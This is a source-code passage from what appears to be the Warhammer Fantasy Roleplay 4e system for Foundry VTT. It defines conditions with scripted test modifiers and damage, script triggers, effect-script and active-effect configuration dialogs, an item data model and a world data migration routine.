                    scriptData: [
                        {
                            trigger: "manual",
                            label : "@effect.name",
                            script : `let leastProtectedLoc;
                            let leastProtectedValue = 999;
                            for (let loc in this.actor.status.armour)
                            {
                                if (this.actor.status.armour[loc].value != undefined && this.actor.status.armour[loc].value < leastProtectedValue)
                                {
                                    leastProtectedLoc = loc;
                                    leastProtectedValue = this.actor.status.armour[loc].value;
                                }
                            }

                            let formula = "1d10 + @effect.conditionValue - 1"
                            let msg = "<b>${game.i18n.localize("Formula")}</b>: @FORMULA"

                            let scriptArgs = {msg, formula}
                            await Promise.all(this.actor.runScripts("preApplyCondition", {effect : this.effect, data : scriptArgs}));
                            formula = scriptArgs.formula;
                            msg = scriptArgs.msg;
                            let roll = await new Roll(formula, this).roll();
                            let terms = roll.terms.map(i => (i instanceof Die ? (i.formula + " (" + i.total + ")") : (i.total))).join("")
                            msg = msg.replace("@FORMULA", terms);

                            let damageMsg = ("<br>" + await this.actor.applyBasicDamage(roll.total, {loc: leastProtectedLoc, suppressMsg : true})).split("")
                            msg += damageMsg.join("");
                            await Promise.all(this.actor.runScripts("applyCondition", {effect : this.effect}))
                            if (args.suppressMessage)
                            {
                                let messageData = game.wfrp4e.utility.chatDataSetup(msg);
                                messageData.speaker = {alias: this.actor.prototypeToken.name}
                                messageData.flavor = this.effect.name
                                return messageData
                            }
                            else
                            {
                                return this.script.scriptMessage(msg)
                            }
                            `
                        }
                    ]
                }
            }
        },
        {
            icon: "systems/wfrp4e/icons/conditions/deafened.png",
            id: "deafened",
            statuses: ["deafened"],
            name: "WFRP4E.ConditionName.Deafened",
            flags: {
                wfrp4e: {
                    value: 1,
                    applicationData : {},
                    scriptData: [
                        {
                            trigger: "dialog",
                            label : "Tests related to hearing",
                            script : `args.fields.modifier -= 10 * this.effect.conditionValue`
                        }
                    ]
                }
            }
        },
        {
            icon: "systems/wfrp4e/icons/conditions/stunned.png",
            id: "stunned",
            statuses: ["stunned"],
            name: "WFRP4E.ConditionName.Stunned",
            flags: {
                wfrp4e: {
                    value: 1,
                    applicationData : {},
                    scriptData: [
                        {
                            trigger: "dialog",
                            label : "Penalty to all Tests (@effect.name)",
                            script : `args.fields.modifier -= 10 * this.effect.conditionValue`,
                            options : {
                                dialog : {
                                    activateScript : "return true"
                                }
                            }
                        }
                        // { // Not sure what to do about this
                        //     trigger: "dialog",
                        //     label : "Bonus to Melee Attacks",
                        //     script : `args.fields.modifier -= 10 * this.effect.conditionValue`,
                        //     "options.dialog.targeter" : true
                        // }
                    ]
                }
            }
        },
        {
            icon: "systems/wfrp4e/icons/conditions/entangled.png",
            id: "entangled",
            statuses: ["entangled"],
            name: "WFRP4E.ConditionName.Entangled",
            flags: {
                wfrp4e: {
                    value: 1,
                    applicationData : {},
                    scriptData: [
                        {
                            trigger: "dialog",
                            label : "Tests related to movement of any kind",
                            script : `args.fields.modifier -= 10 * this.effect.conditionValue`,
                            options : {
                                dialog : {
                                    activateScript : "return ['ws', 'bs', 'ag'].includes(args.characteristic)"
                                }
                            }
                        }
                    ]
                }
            }
        },
        {
            icon: "systems/wfrp4e/icons/conditions/fatigued.png",
            id: "fatigued",
            statuses: ["fatigued"],
            name: "WFRP4E.ConditionName.Fatigued",
            flags: {
                wfrp4e: {
                    value: 1,
                    applicationData : {},
                    scriptData: [
                        {
                            trigger: "dialog",
                            label : "Penalty to all Tests (@effect.name)",
                            script : `args.fields.modifier -= 10 * this.effect.conditionValue`,
                            options : {
                                dialog : {
                                    activateScript : "return true"
                                }
                            }
                        }
                    ]
                }
            }
        },
        {
            icon: "systems/wfrp4e/icons/conditions/blinded.png",
            id: "blinded",
            statuses: ["blinded"],
            name: "WFRP4E.ConditionName.Blinded",
            flags: {
                wfrp4e: {
                    value: 1,
                    applicationData : {},
                    scriptData: [
                        {
                            trigger: "dialog",
                            label : "Tests related to sight",
                            script : `args.fields.modifier -= 10 * this.effect.conditionValue`,
                            options : {
                                dialog : {
                                    activateScript : "return ['ws', 'bs', 'ag'].includes(args.characteristic)"
                                }
                            }
                        },
                        {
                            trigger: "dialog",
                            label : "Bonus to melee attacks",
                            script : `args.fields.modifier += 10 * this.effect.conditionValue`,
                            options : {
                                dialog : {
                                    targeter : true,
                                    hideScript : "return args.item?.attackType != 'melee'",
                                    activateScript : "return args.item?.attackType == 'melee'"
                                }
                            }
                        }
                    ]
                }
            }
        },
        {
            icon: "systems/wfrp4e/icons/conditions/broken.png",
            id: "broken",
            statuses: ["broken"],
            name: "WFRP4E.ConditionName.Broken",
            flags: {
                wfrp4e: {
                    value: 1,
                    applicationData : {},
                    scriptData: [
                        {
                            trigger: "dialog",
                            label : "Penalty to all Tests not involving running and hiding.",
                            script : `args.fields.modifier -= 10 * this.effect.conditionValue`,
                            options : {
                                dialog : {
                                    activateScript : "return !args.skill?.name?.includes(game.i18n.localize('NAME.Stealth')) && args.skill?.name != game.i18n.localize('NAME.Athletics')"
                                }
                            }
                        }
                    ]
                }
            }
        },
        {
            icon: "systems/wfrp4e/icons/conditions/prone.png",
            id: "prone",
            statuses: ["prone"],
            name: "WFRP4E.ConditionName.Prone",
            flags: {
                wfrp4e: {
                    applicationData : {},
                    scriptData: [
                        {
                            trigger: "dialog",
                            label : "Tests related to movement of any kind",
                            script : `args.fields.modifier -= 20`,
                            options : {
                                dialog : {
                                    activateScript : "return ['ws', 'bs', 'ag'].includes(args.characteristic)"
                                }
                            }
                        },
                        {
                            trigger: "dialog",
                            label : "Bonus to melee attacks",
                            script : `args.fields.modifier += 20`,
                            options : {
                                dialog : {
                                    targeter : true,
                                    hideScript : "return args.item?.system.attackType != 'melee'",
                                    activateScript : "return args.item?.system.attackType == 'melee'"
                                }
                            }
                        }
                    ]
                }
            }
        },
        {
            icon: "systems/wfrp4e/icons/conditions/surprised.png",
            id: "surprised",
            statuses: ["surprised"],
            name: "WFRP4E.ConditionName.Surprised",
            flags: {
                wfrp4e: {
                    applicationData : {},
                    scriptData: [
                        {
                            trigger: "dialog",
                            label : "Bonus to melee attacks",
                            script : `args.fields.modifier += 20`,
                            options : {
                                dialog : {
                                    targeter : true,
                                    hideScript : "return args.item?.system.attackType != 'melee'",
                                    activateScript : "return args.item?.system.attackType == 'melee'"
                                }
                            }
                        }
                    ]
                }
            }
        },
        {
            icon: "systems/wfrp4e/icons/conditions/unconscious.png",
            id: "unconscious",
            statuses: ["unconscious"],
            name: "WFRP4E.ConditionName.Unconscious",
            flags: {
                wfrp4e: {
                    "value": null
                }
            }
        },
        {
            icon: "systems/wfrp4e/icons/conditions/grappling.png",
            id: "grappling",
            statuses: ["grappling"],
            name: "WFRP4E.ConditionName.Grappling",
            flags: {
                wfrp4e: {
                    "value": null
                }
            }
        },
        {
            icon: "systems/wfrp4e/icons/conditions/engaged.png",
            id: "engaged",
            statuses: ["engaged"],
            name: "WFRP4E.ConditionName.Engaged",
            flags: {
                wfrp4e: {
                    applicationData : {},
                    scriptData: [
                        {
                            trigger: "dialog",
                            label : "@effect.name",
                            script : `args.abort = true
                            ui.notifications.error(game.i18n.localize("EFFECT.ShooterEngagedError"))`,
                            options : {
                                dialog : {
                                    hideScript : "return !args.weapon || args.weapon.isMelee || args.weapon.properties.qualities.pistol",
                                    activateScript : "return args.weapon.isRanged && !args.weapon.properties.qualities.pistol"
                                }
                            }
                        }
                    ]
                }
            }
        },
        {
            icon: "systems/wfrp4e/icons/defeated.png",
            id: "dead",
            statuses: ["dead"],
            name: "WFRP4E.ConditionName.Dead",
            flags: {
                wfrp4e: {
                    "value": null
                }
            }
        }
    ];
};


WFRP4E.effectTextStyle = CONFIG.canvasTextStyle.clone();
WFRP4E.effectTextStyle.fontSize = "30";
WFRP4E.effectTextStyle.fontFamily="CaslonAntique";

WFRP4E.rollModes = CONFIG.Dice.rollModes;

WFRP4E.effectApplications = {
    document : "EffectApplication.Type.Document",
    damage : "EffectApplication.Type.Damage",
    target : "EffectApplication.Type.Target",
    area : "EffectApplication.Type.Area",
    aura : "EffectApplication.Type.Aura",
    crew : "EffectApplication.Type.Crew",
    other : "EffectApplication.Type.Other"
};


// To migrate
// "invoke => manual"
// "oneTime" => "immediate"
// "addItems" => "immediate"
// "dialogChoice" => ???
// "prefillDialog" => "dialog"
// "targetPrefillDialog" => "dialog" with targeter option true
WFRP4E.scriptTriggers = {
    "manual" : "Manually Invoked",
    "immediate" : "Immediate",
    "dialog" : "Dialog",
    "addItems" : "Add Items",
    "preUpdate" : "Pre Update",
    "update" : "On Update",
    "equipToggle" : "Equip Toggle",
    "prePrepareData" : "Pre-Prepare Data",
    "prePrepareItems" : "Pre-Prepare Actor Items",
    "prepareData" : "Prepare Data",
    "prepareOwned" : "Prepare Owned Data (For Items)",
    "computeCharacteristics" : "Compute Characteristics",
    "computeEncumbrance" : "Compute Encumbrance",
    "preWoundCalc" : "Pre-Wound Calculation",
    "woundCalc" : "Wound Calculation",
    "calculateSize" : "Size Calculation",
    "preAPCalc" : "Pre-Armour Calculation",
    "APCalc" : "Armour Calculation",
    "preApplyDamage" : "Pre-Apply Damage",
    "applyDamage" : "Apply Damage",
    "preTakeDamage" : "Pre-Take Damage",
    "takeDamage" : "Take Damage",
    "computeTakeDamageModifiers" : "Compute Take Damage Modifiers",
    "computeApplyDamageModifiers" : "Compute Apply Damage Modifiers",
    "preApplyCondition" : "Pre-Apply Condition",
    "applyCondition" : "Apply Condition",
    "prePrepareItem" : "Pre-Prepare Item",
    "prepareItem" : "Prepare Item",
    "preRollTest" : "Pre-Roll Test",
    "preRollWeaponTest" : "Pre-Roll Weapon Test",
    "preRollCastTest" : "Pre-Roll Casting Test",
    "preChannellingTest" : "Pre-Roll Channelling Test",
    "preRollPrayerTest" : "Pre-Roll Prayer Test",
    "preRollTraitTest" : "Pre-Roll Trait Test",
    "rollTest" : "Roll Test",
    "rollIncomeTest" : "Roll Income Test",
    "rollWeaponTest" : "Roll Weapon Test",
    "rollCastTest" : "Roll Casting Test",
    "rollChannellingTest" : "Roll Channelling Test",
    "rollPrayerTest" : "Roll Prayer Test",
    "rollTraitTest" : "Roll Trait Test",
    "preOpposedAttacker" : "Pre-Opposed Attacker",
    "preOpposedDefender" : "Pre-Opposed Defender",
    "opposedAttacker" : "Opposed Attacker",
    "opposedDefender" : "Opposed Defender",
    "calculateOpposedDamage" : "Calculate Opposed Damage",
    "targetPrefillDialog" : "Prefill Targeter's Dialog",
    "getInitiativeFormula" : "Get Initiative",
    "createToken" : "Create Token",
    "deleteEffect" : "Effect Deleted",
    "endTurn" : "End Turn",
    "startTurn" : "Start Turn",
    "endRound" : "End Round",
    "endCombat" : "End Combat"
};

WFRP4E.syncTriggers = [
    "prePrepareData",
    "prePrepareItems",
    "prepareData",
    "preWoundCalc",
    "woundCalc",
    "calculateSize",
    "preAPCalc",
    "APCalc",
    "prePrepareItem",
    "prepareItem",
    "getInitiativeFormula"
];

class ActorSettings extends FormApplication {
    static get defaultOptions() {
        const options = super.defaultOptions;
        options.id = "actor-settings";
        options.template = "systems/wfrp4e/templates/apps/actor-settings.hbs";
        options.height = "auto";
        options.width = 400;
        options.minimizable = true;
        options.title = "Actor Settings";
        return options;
    }

    getData() {
        let data = super.getData();
        data.tables =  game.wfrp4e.config.hitLocationTables;

        data.displays = {};

        if (this.object.type == "character")
        {
            data.displays.size = true;
            data.displays.movement = true;
            data.displays.wounds = true;
            data.displays.critwounds = true;
            data.displays.corruption = true;
            data.displays.encumbrance = true;
            data.displays.hitloc = true;
            data.displays.equipPoints = true;
            data.displays.mainHand = true;
        }
        if (this.object.type == "npc")
        {
            data.displays.size = true;
            data.displays.movement = true;
            data.displays.wounds = true;
            data.displays.critwounds = true;
            data.displays.encumbrance = true;
            data.displays.hitloc = true;
            data.displays.equipPoints = true;
            data.displays.mainHand = true;
        }
        if (this.object.type == "creature")
        {
            data.displays.size = true;
            data.displays.movement = true;
            data.displays.wounds = true;
            data.displays.critwounds = true;
            data.displays.encumbrance = true;
            data.displays.hitloc = true;
            data.displays.equipPoints = true;
        }
        if (this.object.type == "vehicle")
        {
            data.displays.vehicle = true;
            data.displays.critwounds = true;
            data.displays.hitloc = true;
        }

        return data
    }


    async _updateObject(event, formData) {
        this.object.update(formData);
    }

  

}

class EffectScriptConfig extends ScriptConfig
{
    scriptLock = true; // User lock toggled

    static get defaultOptions() 
    {
        const options = super.defaultOptions;
        options.classes.push("effect-script");
        return options;
    }

    get scriptLocked()
    {
        return this._hasScriptReferences() && this.scriptLock;
    }

    async getData() 
    {
        let data = await super.getData();
        data.hasScriptReferences = this._hasScriptReferences();
        data.scriptLock = data.hasScriptReferences && this.scriptLock;
        // only lock script if it's an actual reference, otherwise, it's not locked and can be edited even if script lock is turned on
        data.lockedScripts = {
            "script" : this._isScriptReference("script") && this.scriptLock,
            "hideScript" : this._isScriptReference("hideScript") && this.scriptLock,
            "activateScript" : this._isScriptReference("activateScript") && this.scriptLock,
            "submissionScript" : this._isScriptReference("submissionScript") && this.scriptLock
        };
        data.dereferencedScripts = this._dereferencedScripts();
        data.script = this._getScript();
        data.extraFieldsHTML = await this._renderExtraFields(data.dereferencedScripts, data.lockedScripts);
        return data;
    }

    _getAceEditorContents()
    {
        // If script is locked and is a reference, dereference, otherwise, show the script ID
        return (this._isScriptReference("script") && this.scriptLock) ? this._dereference("script") : super._getAceEditorContents();
    }


    _dereferencedScripts()
    {
        let data = {};
        data.script = this._dereference("script");
        foundry.utils.setProperty(data, "options.dialog.hideScript", this._dereference("options.dialog.hideScript"));
        foundry.utils.setProperty(data, "options.dialog.activateScript", this._dereference("options.dialog.activateScript"));
        foundry.utils.setProperty(data, "options.dialog.submissionScript", this._dereference("options.dialog.submissionScript"));
        return data;
    }

    _dereference(scriptProperty)
    {
        let object = this._getScriptObject();
        let regex = /\[Script.([a-zA-Z0-9]{16})\]/gm;
        let matches = Array.from((getProperty(object, scriptProperty) || "").matchAll(regex));
        let id = matches[0]?.[1];

        return game.wfrp4e.config.effectScripts[id] || foundry.utils.getProperty(object, scriptProperty);
    }

    _renderExtraFields(dereferencedScripts, lockedScripts)
    {
        return renderTemplate("systems/wfrp4e/templates/apps/script-fields.hbs", {script: this._getScriptObject(), dereferencedScripts, lockedScripts});
    }

    _getScript()
    {
        return this._getScriptObject()?.script;
    }

    _getScriptObject()
    {
        let data = foundry.utils.deepClone(getProperty(this.object, "flags.wfrp4e.scriptData")?.[this.options.index]);
        return data;
    }

    _isScriptReference(type)
    {
        let regex = /\[Script.([a-zA-Z0-9]{16})\]/gm;
        let object = this._getScriptObject();
        if (type == "script")
        {
            return !!object.script.match(regex);
        }
        else 
        {
            return !!(getProperty(object, "options.dialog." + type) || "").match(regex);
        }
    }

    _hasScriptReferences()
    {
        return this._isScriptReference("script") || this._isScriptReference("hideScript") || this._isScriptReference("activateScript") || this._isScriptReference("submissionScript");
    }

    async _updateObject(ev, formData)
    {
        let script = (this.aceActive && !this.editor.getReadOnly()) ? this.editor.getValue() : formData.script; 

        let array = foundry.utils.deepClone(getProperty(this.object, "flags.wfrp4e.scriptData"));
        let scriptObject = array[this.options.index];
        scriptObject.label = formData.label;
        scriptObject.trigger = formData.trigger;
        if (foundry.utils.hasProperty(formData, "hideScript"))
        {
            foundry.utils.setProperty(scriptObject, "options.dialog.hideScript", formData.hideScript);
        }
        if (foundry.utils.hasProperty(formData, "activateScript"))
        {
            foundry.utils.setProperty(scriptObject, "options.dialog.activateScript", formData.activateScript);
        }
        if (foundry.utils.hasProperty(formData, "submissionScript"))
        {
            foundry.utils.setProperty(scriptObject, "options.dialog.submissionScript", formData.submissionScript);
        }
        
        foundry.utils.setProperty(scriptObject, "options.dialog.targeter", formData.targeter);
        foundry.utils.setProperty(scriptObject, "options.immediate.deleteEffect", formData.deleteEffect);
        if(script)
        {
            scriptObject.script = script;
        }

        return this.object.update({"flags.wfrp4e.scriptData" : array});
    }

    activateListeners(html)
    {
        super.activateListeners(html);

        this.hideTriggerOptions(html);

        html.find("[name='trigger']").change(ev => 
        {
            this.showTriggerOptions(ev.currentTarget.value);
        });

        html.find(".script-lock").change(ev => 
        {
            this.scriptLock = ev.currentTarget.checked;
            this.render(true);
        });

        this.showTriggerOptions(this._getScriptObject().trigger);

        if (this.aceActive)
        {
            this.editor.setReadOnly(this._isScriptReference("script") && this.scriptLock);
        }
    }

    showTriggerOptions(trigger)
    {
        this.hideTriggerOptions(this.element);

        if (trigger)
        {
            this.element.find(`[data-option=${trigger}]`).show();
        }

        if (this.aceActive)
            this.editor.resize();
    }

    hideTriggerOptions(html)
    {
        html.find("[data-option]").hide();
    }
}

class WFRP4eActiveEffectConfig extends ActiveEffectConfig 
{
    static get defaultOptions() 
    {
        const options = super.defaultOptions;
        options.classes.push("wfrp4e");
        options.width = 610;
        return options;
    }

    async _render(force, options)
    {
        await super._render(force, options);

        let scriptHTML = await renderTemplate("systems/wfrp4e/templates/apps/effect-scripts.hbs", {scripts : this.object.scriptData});
        let effectApplicationHTML = await renderTemplate("systems/wfrp4e/templates/apps/effect-application-config.hbs", this);

        // Add Scripts Tab and tab section
        this.element.find("nav").append(`<a class='item' data-tab="scripts"><i class="fas fa-gavel"></i>${game.i18n.localize("EFFECT.TabWFRP")}</a>`);
        $(`<section class='tab' data-tab="scripts">${scriptHTML}</section>`).insertBefore(this.element.find("footer"));

        // Replace transfer field with Effect Application data (used to derive transfer value)
        this.element.find("[name='transfer']").parents(".form-group").replaceWith(effectApplicationHTML);

        // // Replace attribute key field with a select field
        // let effectsTab = this.element.find("section[data-tab='effects']");

        // // Add a checkbox to toggle between <select> and <input> for effect keys
        // $(`<div class="form-group">
        // <label>${game.i18n.localize("ManualEffectKeys")}</label>
        // <input type="checkbox" class="manual-keys" name="flags.wfrp4e.manualEffectKeys" ${this.object.getFlag("wfrp4e", "manualEffectKeys") ? "checked" : ""}>
        // </div>`).insertBefore(effectsTab.find(".effects-header"));

        // // Replace all key inputs with <select> fields (unless disabled)
        // if (!this.object.getFlag("wfrp4e", "manualEffectKeys"))
        // {
        //     for (let element of effectsTab.find(".key input"))
        //     {
        //         $(element).replaceWith(await renderTemplate("systems/wfrp4e/templates/apps/effect-key-options.hbs", {name : element.name, value : element.value}));
        //     }
        // }

        // Activate Script tab if that is the cause of the rerender. It is added after rendering so won't be automatically handled by the Tabs object
        if (options.data?.flags?.wfrp4e?.scriptData)
        {
            this.activateTab("scripts");
        }
        this.element.css("height", "auto");
    }

    activateListeners(html)
    {
        super.activateListeners(html);

        html.on("click", ".add-script", () => 
        {
            let scripts = this.object.scriptData.concat({label : game.i18n.localize("SCRIPT.NewScript"), script : ""});
            return this.submit({preventClose: true, updateData: {
                [`flags.wfrp4e.scriptData`]: scripts
            }});
        });

        html.on("click", ".script-delete", ev => 
        {
            let index = this._getDataAttribute(ev, "index");
            let scripts = this.object.scriptData.filter((value, i) => i != index);
            return this.submit({preventClose: true, updateData: {
                [`flags.wfrp4e.scriptData`]: scripts
            }});
        });

        html.on("click", ".script-edit", ev => 
        {
            let index = this._getDataAttribute(ev, "index");
            new EffectScriptConfig(this.object, {index}).render(true);
        });

        html.on("click", ".script-config", ev => 
        {
            new ScriptConfig(this.object, {path : this._getDataAttribute(ev, "path")}).render(true);
        });

        html.on("change", ".wfrp4e-effect-config input,.wfrp4e-effect-config select", () => 
        {
            this.submit({preventClose: true});
        });

        html.on("change", ".manual-keys", () => 
        {
            this.submit({preventClose: true});
        });

        html.on("click", ".configure-template", () => {
            new EmbeddedMeasuredTemplateConfig(this.object).render(true);
        });
    }

    _getIndex(ev) 
    {
        return Number(this._getDataAttribute(ev, "index"));
    }
  
    _getPath(ev) 
    {
        return this._getDataAttribute(ev, "path");
    }

  
    /**
     * Search for an HTML data property, specified as data-<property>
     * First search target of the event, then search in parent properties
     * 
     * @param {Event} ev Event triggered
     * @param {String} property data-<property> being searched for
     * @returns 
     */
    _getDataAttribute(ev, property)
    {
        let value = ev.target.dataset[property];
  
        if (!value) 
        {
            const parent = $(ev.target).parents(`[data-${property}]`);
            if (parent) 
            {
                value = parent[0]?.dataset[property];
            }
        }
        return value;
    }
  

}


class EmbeddedMeasuredTemplateConfig extends MeasuredTemplateConfig
{
    async _updateObject(event, formData)
    {
        this.object.update({"flags.wfrp4e.applicationData.templateData" : formData});
    }

    async _render(force, options)
    {   
        await super._render(force, options);
        this.element.find("[name='t']")[0].disabled = true;
        this.element.find("[name='x']")[0].disabled = true;
        this.element.find("[name='y']")[0].disabled = true;
        this.element.find("[name='direction']")[0].disabled = true;
        this.element.find("[name='angle']")[0].disabled = true;
        this.element.find("[name='distance']")[0].disabled = true;
        this.element.find("[name='width']")[0].disabled = true;
    }

    async getData()
    {
        let data = await super.getData();
        data.data = this.object.flags.wfrp4e.applicationData.templateData;
        return data;
    }
}

let fields$A = foundry.data.fields;

class PhysicalItemModel extends BaseItemModel
{
    static defineSchema() 
    {
        let schema = super.defineSchema();
        schema.quantity = new fields$A.SchemaField({
            value: new fields$A.NumberField({initial: 1, min : 0})
        });
        schema.encumbrance = new fields$A.SchemaField({
            value: new fields$A.NumberField()
        });
        schema.price = new fields$A.SchemaField({
            gc: new fields$A.NumberField(),
            ss: new fields$A.NumberField(),
            bp: new fields$A.NumberField()
        });
        schema.availability = new fields$A.SchemaField({
            value: new fields$A.StringField()
        });
        schema.location = new fields$A.SchemaField({
            value: new fields$A.StringField()
        });
        schema.damageToItem = new fields$A.SchemaField({
            value: new fields$A.NumberField(),
            shield: new fields$A.NumberField(),
        });
        return schema;
    }

    async preCreateData(data, options, user)
    {
       let preCreateData = await super.preCreateData(data, options, user);

       // Previously this checked if item was still owned, not sure if that's necessary 
       // It seems that every case where a new item is created, it should clear the location
       foundry.utils.setProperty(preCreateData, "system.location.value",  "");

       return preCreateData;
    }

    computeBase() 
    {
        this.encumbrance.total = 0;
        super.computeBase();

        this.encumbrance.total = this.computeEncumbrance();
        this.reduceEquippedEncumbrance();
    }

    computeEncumbrance() 
    {
        let enc = 0;
        if (this.encumbrance && this.quantity) 
        {
            enc = (this.encumbrance.value * this.quantity.value);
            if (this.encumbrance.value % 1 != 0)
            {
                enc = enc.toFixed(2);
            }
        }
        return enc
    }

    reduceEquippedEncumbrance()
    {
        if (this.isEquipped) 
        {
            this.encumbrance.total = Math.max(0, this.encumbrance.total - 1);
        }
    }

/**
 * Helper method to apply damage to an item
 * 
 * @param {number} value Damage the item by this amount
 */
    damageItem(value = 1) 
    {
        // Can ignore .shield because that is exclusive to weapons
        let currentDamage = this.damageToItem.value + value;

        // If maxDamageTaken is undefined, there is no max
        let max = this.maxDamageTaken();
        if (max && currentDamage > max) 
        {
            currentDamage = max;
        }

        return this.parent.update({ [`system.damageToItem.value`]: currentDamage})
    }


    /**
     * Defines the amount of damage this item can take
     * @abstract
     */
    maxDamageTaken()
    {

    }

    /**
     * Reduces the quantity of this Item by specified amount.
     *
     * @param {number} amount by how much should the quantity be reduced?
     *
     * @returns {Promise<ItemWfrp4e>}
     */
    async reduceQuantity(amount = 1) {
        return await this.parent.update({"system.quantity.value": this.quantity.value - amount});
    }

    static migrateData(data)
    {
        if (data.location?.value === '0')
        {
            data.location.value = '';
        }
    }
}

class Migration {

  static async migrateWorld() {
    ui.notifications.info(`Applying WFRP4e System Migration for version ${game.system.version}. Please be patient and do not close your game or shut down your server.`, { permanent: true });


      let updates = [];
      // Migrate Journals
      for (let i of game.journal.contents) {
        try {
          let updateData = Migration.migrateJournalData(i);
          if (!foundry.utils.isEmpty(updateData) || updateData.pages.length > 0) {
            updates.push(updateData);
            console.log(`Migrating Journal document ${i.name}`);
          }
        } catch (err) {
          err.message = `Failed wfrp4e system migration for Journal ${i.name}: ${err.message}`;
          console.error(err);
        }
      }
      await JournalEntry.updateDocuments(updates);

      updates = [];
      // Migrate Tables
      for (let i of game.tables.contents) {
        try {
          let updateData = Migration.migrateTableData(i);
          if (!foundry.utils.isEmpty(updateData) || updateData.results.length > 0) {
            updates.push(updateData);
            console.log(`Migrating Table document ${i.name}`);
          }
        } catch (err) {
          err.message = `Failed wfrp4e system migration for RollTable ${i.name}: ${err.message}`;
          console.error(err);
        }
      }
      await RollTable.updateDocuments(updates);



    // Migrate World Items
    for (let i of game.items.contents) {
      try {
        let updateData = Migration.migrateItemData(i.toObject());
        if (!foundry.utils.isEmpty(updateData)) {
          console.log(`Migrating Item document ${i.name}`);
          await i.update(updateData, { enforceTypes: false });
        }
        let loreIds = this._loreEffectIds(i);
        if (loreIds.length)
        {
          await i.deleteEmbeddedDocuments("ActiveEffect", loreIds);
        }
      } catch (err) {
        err.message = `Failed wfrp4e system migration for Item ${i.name}: ${err.message}`;
        console.error(err);
      }
    }

    for (let p of game.packs) {
      if (p.metadata.type == "Item" && p.metadata.package == "world")
        await Migration.migrateCompendium(p);
    }
    for (let p of game.packs) {
      if (p.metadata.type == "Actor" && p.metadata.package == "world")
        await Migration.migrateCompendium(p);
    }
    for (let p of game.packs) {
      if (p.metadata.type == "Scene" && p.metadata.package == "world")
        await Migration.migrateCompendium(p);
    }

    // Migrate World Actors
    for (let a of game.actors.contents) {
      try {
        let updateData = Migration.migrateActorData(a);
        if (!foundry.utils.isEmpty(updateData)) {
          console.log(`Migrating Actor document ${a.name}`);
          await a.update(updateData, { enforceTypes: false });
        }
        let loreIds = this._loreEffectIds(a);
        if (loreIds.length)
        {
          await a.deleteEmbeddedDocuments("ActiveEffect", loreIds);
        }
        await this.migrateActorEffects(a, true);
      } catch (err) {
        err.message = `Failed wfrp4e system migration for Actor ${a.name}: ${err.message}`;
        console.error(err);
      }
    }

    // // Migrate Actor Override Tokens
    // for (let s of game.scenes.contents) {
    //   try {
    //     let updateData = Migration.migrateSceneData(s);
    //     if (!foundry.utils.isEmpty(updateData)) {
    //       console.log(`Migrating Scene document ${s.name}`);
    //       await s.update(updateData, { enforceTypes: false });
    //       // If we do not do this, then synthetic token actors remain in cache
    //       // with the un-updated actorData.
    //       s.tokens.contents.forEach(t => t._actor = null);
    //     }
    //   } catch (err) {
    //     err.message = `Failed wfrp4e system migration for Scene ${s.name}: ${err.message}`;
    //     console.error(err);
    //   }
    // }

    // // Set the migration as complete
    ui.notifications.info(`wfrp4e System Migration to version ${game.system.version} completed!`, { permanent: true });
  };

  /* -------------------------------------------- */

  /**
   * Apply migration rules to all Entities within a single Compendium pack
   * @param pack
   * @return {Promise}
   */
  static async migrateCompendium(pack) {
    const document = pack.metadata.type;
    if (!["Actor", "Item", "Scene"].includes(document)) return;

    // Unlock the pack for editing
    const wasLocked = pack.locked;
    await pack.configure({ locked: false });

    // Begin by requesting server-side data model migration and get the migrated content
    await pack.migrate();
    const documents = await pack.getDocuments();

    // Iterate over compendium entries - applying fine-tuned migration functions
    for (let doc of documents) {
      let updateData = {};
      try {
        switch (document) {
          case "Actor":
            updateData = Migration.migrateActorData(doc);
            await this.migrateActorEffects(doc, true);
            break;
          case "Item":
            updateData = Migration.migrateItemData(doc);
            break;
          case "Scene":
            updateData = Migration.migrateSceneData(doc);
            break;
        }

        // Save the entry, if data was changed
        if (foundry.utils.isEmpty(updateData)) continue;
        await doc.update(updateData);
        console.log(`Migrated ${document} document ${doc.name} in Compendium ${pack.collection}`);
      }

      // Handle migration failures
      catch (err) {
        err.message = `Failed wfrp4e system migration for document ${doc.name} in pack ${pack.collection}: ${err.message}`;
        console.error(err);
      }
    }

    // Apply the original locked status for the pack
    await pack.configure({ locked: wasLocked });
    console.log(`Migrated all ${document} entities from Compendium ${pack.collection}`);
  };

  /* -------------------------------------------- */
  /*  Entity Type Migration Helpers               */
  /* -------------------------------------------- */

  /**
   * Migrate a single Actor entity to incorporate latest data model changes
   * Return an Object of updateData to be applied
   * @param {object} actor    The actor data object to update
   * @return {Object}         The updateData to apply
   */
  static migrateActorData(actor) {
    let updateData = {};

    // Migrate Owned Items
    if (actor.items) {
      const items = actor.items.reduce((arr, i) => {
        // Migrate the Owned Item
        let itemUpdate = Migration.migrateItemData(i);

        // Update the Owned Item
        if (!foundry.utils.isEmpty(itemUpdate)) {
          itemUpdate._id = i.id;
          arr.push(expandObject(itemUpdate));
        }

        return arr;
      }, []);
      if (items.length > 0) updateData.items = items;
    }

    let html = this._migrateV10Links(actor.system.details.biography?.value);
    if (html != actor.system.details.biography?.value)
    {
      updateData["system.details.biography.value"] = html;
    }

    html = this._migrateV10Links(actor.system.details.gmnotes?.value);
    if (html != actor.system.details.gmnotes?.value)
    {
      updateData["system.details.gmnotes.value"] = html;
    }
    
    html = this._migrateV10Links(actor.system.details.description?.value);
    if (html != actor.system.details.description?.value)
    {
      updateData["system.details.description.value"] = html;
    }

    html = this._migrateV10Links(actor.system.details.gmdescription?.value);
    if (html != actor.system.details.gmdescription?.value)
    {
      updateData["system.details.gmdescription.value"] = html;
    }


    if (actor.type == "vehicle")
    {
      if (actor.system.roles?.length)
      {
        let roleItems = [];
        for(let role of actor.system.roles)
          {
            roleItems.push({name : role.name, img : "systems/wfrp4e/icons/blank.png", type : "vehicleRole", system : {
              test : role.test
            }});
      }
      if (roleItems.length)
        {
          updateData.items = updateData.items ? updateData.items.concat(roleItems) : roleItems;
          updateData["system.roles"] = [];
        }
      }
    }

    return updateData;
  };

  static async migrateActorEffects(actor, update=false)
  {
    let itemsUpdate = [], deleteActorEffects = [];

    for (let effect of actor.effects)
    {
      let origin = effect.origin?.split(".");
      let item = actor.items.get(origin?.[origin.length-1]);
      if (origin && item)
      {
          let existingUpdate = itemsUpdate.find(i => i._id == item.id);
          let itemEffect = item.effects.getName(effect.name)?.toObject() || {};
          let oldId = itemEffect._id;
          let oldChanges = itemEffect.changes;
          foundry.utils.mergeObject(itemEffect, effect.toObject()); 
          itemEffect._id = oldId; // Preserve item id so effect isn't duplicated on the item
          
          if (itemEffect.changes.length == 0)
          {
